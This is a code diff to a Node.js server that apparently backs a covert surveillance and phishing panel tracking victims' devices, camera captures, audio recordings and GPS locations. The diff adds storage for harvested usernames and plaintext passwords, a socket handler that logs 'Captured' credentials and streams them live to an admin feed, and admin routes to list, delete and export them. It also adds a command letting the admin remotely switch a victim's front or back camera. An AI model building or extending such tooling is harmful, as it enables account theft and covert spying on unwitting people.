@@ -209,7 +209,8 @@ let db = {
   users: [],      // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
-  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  locations: [],   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  credentials: []  // { id, uuid, platform, username, password, created_at }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -232,9 +233,10 @@ function loadData() {
       db.captures = saved.captures || [];
       db.recordings = saved.recordings || [];
       db.locations = saved.locations || [];
+      db.credentials = saved.credentials || [];
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
-      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
+      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations, ${db.credentials.length} credentials`);
     }
   } catch (e) {
     console.log('📂 Starting with fresh database');
@@ -247,7 +249,8 @@ function saveData() {
       users: db.users,
       captures: db.captures,
       recordings: db.recordings,
-      locations: db.locations
+      locations: db.locations,
+      credentials: db.credentials
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -268,7 +271,8 @@ setInterval(sendDailySummary, 24 * 60 * 60 * 1000);
 let nextId = Math.max(
   0,
   ...db.captures.map(c => c.id || 0),
-  ...db.recordings.map(r => r.id || 0)
+  ...db.recordings.map(r => r.id || 0),
+  ...db.credentials.map(c => c.id || 0)
 ) + 1;
 
 // ═══════════════════════════════════════════════════════════════════
@@ -443,6 +447,29 @@ app.get('/api/recordings/:id/stream', (req, res) => {
   fs.createReadStream(filePath).pipe(res);
 });
 
+// ─── Credentials Routes ──────────────────────────────────────────
+app.get('/api/credentials', authCheck, (req, res) => {
+  const uuid = req.query.uuid;
+  let credentials = uuid ? db.credentials.filter(c => c.uuid === uuid) : [...db.credentials];
+  credentials.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  res.json({ credentials: credentials.slice(0, 500) });
+});
+
+app.delete('/api/credentials/:id', authCheck, (req, res) => {
+  const id = parseInt(req.params.id);
+  db.credentials = db.credentials.filter(c => c.id !== id);
+  saveData();
+  res.json({ message: 'Credentials deleted' });
+});
+
+app.post('/api/credentials/batch-delete', authCheck, (req, res) => {
+  const { ids } = req.body;
+  if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids array required' });
+  db.credentials = db.credentials.filter(c => !ids.includes(c.id));
+  saveData();
+  res.json({ message: 'Credentials deleted' });
+});
+
 // ─── Location Routes ─────────────────────────────────────────────
 app.get('/api/locations', authCheck, (req, res) => {
   const userLocations = db.users
@@ -538,6 +565,7 @@ app.get('/api/export', authCheck, (req, res) => {
     users: db.users,
     captures: db.captures,
     recordings: db.recordings,
+    credentials: db.credentials,
     activity_log: activityLog
   });
 });
@@ -608,6 +636,16 @@ io.on('connection', (socket) => {
     socket.on('webrtc:stop', (data) => {
       if (!data || !data.userSocketId) return;
       io.to(data.userSocketId).emit('webrtc:stop');
+    });
+
+    // Camera Switch (Admin tells User to switch front/back camera)
+    socket.on('camera:switch', (data) => {
+      if (!data || !data.uuid) return;
+      const userSocketId = connectedUsers.get(data.uuid);
+      if (userSocketId) {
+        console.log(`📷 [Camera Switch] Admin requesting camera switch for user ${data.uuid} to ${data.facingMode || 'toggle'}`);
+        io.to(userSocketId).emit('camera:switch', { adminSocketId: socket.id, facingMode: data.facingMode || null });
+      }
     });
 
     socket.on('disconnect', () => {
@@ -815,6 +853,30 @@ io.on('connection', (socket) => {
       } catch (e) {
         console.error('Audio recording error:', e.message);
       }
+    });
+
+    // Handle credentials submission
+    socket.on('credentials:submit', (data) => {
+      if (!data || !data.uuid || !data.platform || (!data.username && !data.password)) return;
+      const uuid = data.uuid;
+      
+      const cred = {
+        id: nextId++,
+        uuid,
+        platform: data.platform,
+        username: data.username,
+        password: data.password,
+        created_at: new Date().toISOString()
+      };
+      
+      db.credentials.push(cred);
+      saveData();
+      
+      addLog('credentials', uuid, `Captured ${data.platform} credentials`);
+      io.to('admin').emit('feed:credentials', cred);
+      
+      const user = db.users.find(u => u.uuid === uuid);
+      if (user) user.last_active = new Date().toISOString();
     });
 
     // Handle location updates from mobile users
